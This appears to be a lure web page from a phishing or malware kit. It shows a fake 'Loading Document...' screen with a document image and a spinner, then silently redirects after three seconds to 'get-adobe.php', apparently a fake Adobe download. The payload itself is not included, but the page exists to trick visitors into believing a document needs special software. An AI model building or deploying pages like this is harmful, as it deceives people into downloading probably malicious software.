<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Loading Document...</title>
<link rel="shortcut icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJAAAACQCAYAAADnRuK4AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAVPSURBVHgB7d29bttWGIDh79CShyxx0KVDgWrI1qHqDaT20K1A5PwAGe0rsO+g0RU4uQLbm4HEsYp2t5KlY+Q9gGl0DiAvHmyZp+fIFsoI+iF5JOqIfJ8h+rMBJXnz8ZBiaCVLQDcaNVlZ2Ret6+bhmhRfKEp1zW3X/J475vZCgqAjvV5HtVpd8YgSz/XjCYJTc7cmsGxcbRPWR1ldbaujo1AWyP+ANjffmD+wHcFodzEdLiqmQHwXBD8LxtN63fy6L9fX5/r583396lVNcuR/QEhO6637kE71ixfrkgMCKiI7laLoNI+JREBFNphIz579IXNCQOXw2kR0Po9pREDlUZvHNCKg8nlt1kYns5pGBFRGWjfMNDqdRUQEVF61WUREQOVmI/qsX76sS0YEhDW5vc08iQgI1lrWzRkBYeBuTdRopDpdhoAQZ8+7OknzDQSEb5nP0czBxt2kX05AGGUv6af5BITRomg/yXqIgDCOPZV46udmBIRJdqdtyggIk2k9cQoRECaze2UTphABYTqt98a9RECYTuv6uClEQEhmzFqIgJDMmLUQASG5EVOIgJCcnUJDR6cJCOkEwdY3DwVIQ6mn8YcEhHTsZix25iIBIb3r68bgLgEhvdhmjICQnj0yfb83RkDIYk0qlf7/JSMgZBNFBAQHd5fWIyBkpFT/2pX9q7Q2RNduRXb03aV0vboO89Wj3+pR5czba0PXHz6UncePpfbggZROFD1S9/F81p5ewPsf2ZCv0haf2XhOnzwpX0RR9EvQE9n3NZ5lEV5dycanT/3bUgmCul0DrQuclTSiGovoGSpdREr9SEAzVqqIzCKagOagNBEFARNoXkoRkdZrBDRHJYiIgOat4BERUB6KHBEB5aSoERFQjgYRdS4vpSgIKGdFi4iAFqB7c1OYiAhoQQoSUUhAC1SEiAhowZY6IqWYQD5Y5ogIyBNLGhETyCdLF5HWFwTkmSWLiAnko0FE9tZrQUBAvrLxvP3yRbzW63UIyGOeb8a6qtXqEpDHvN6EKdWxNwSEbKLozN4QELIJgnb/RoAsqlU2YcjIrH/U0VFo7xIQsugM7hAQ0lPqcHCXgJBWV71/3x48ICCko1Qr/pCAkNaf8QcEhDRCdXzMBEJGSrWHnyIgJFetNoefIiAkY6bP4OBhHAEhGaWao54mICQRxo/9xBEQkmiOe4GAMJld+3z4cDDuZQLCZNXq9qSXCQjjKXUwas8rjoAwTjjquM8wAsI4zWnTx6oIMEzrt+rk5CDJlzKBMCw08ewm/WICQlwoq6sbab6BgPC/lZXNJOueOALCwLZ6966T9psICFZz0tHmSdgLw3bWeCwmUHl1xTEeiwlUTmF/wZxhzTOMCVQ29rxms6s+i3gsJlB52E1WUx0fv5EZIqAysFOnWt1Oe4wnCQIqMhuOUs1xp6POgvcBPZCafBWkkkM4A94H9J38Kv/KgWCqrvkU/dDsXbXyCGfA+4B+kC25lDM5l5mu/YrBThp7rcKco4lbijXQT7In38tTsyn7KK565h/qdX+HZHHse7hJ8B5WepXu/dVQw/4TWl/I3TGcjtzchPYyu7Jg6nfzrgS+av8tKtXpFXnjQCKcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCcEBCc2IBm8kM3MBdn4rlAiUz94fLIn/l7CSvi/8Wxg79Etcyb3RYmkU/aKyIbLVGheO4/4mMDvQ4fXO8AAAAASUVORK5CYII=">

<style>
html, body{
    margin:0;
    padding:0;
    width:100%;
    height:100%;
    background:#000;
    overflow:hidden;
}

img{
    width:100vw;
    height:100vh;
    object-fit:contain; /* keeps proportions */
}

.spinner{
    position:absolute;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);
    width:40px;
    height:40px;
    border:4px solid rgba(255,255,255,0.3);
    border-top:4px solid red;
    border-radius:50%;
    animation:spin 1s linear infinite;
}

@keyframes spin{
    to{transform:translate(-50%,-50%) rotate(360deg);}
}
</style>
</head>

<body>

<img src="assets/doc.png">

<div class="spinner"></div>

<script>
setTimeout(function(){
    window.location.href="get-adobe.php";
},3000);
</script>

</body>
</html>

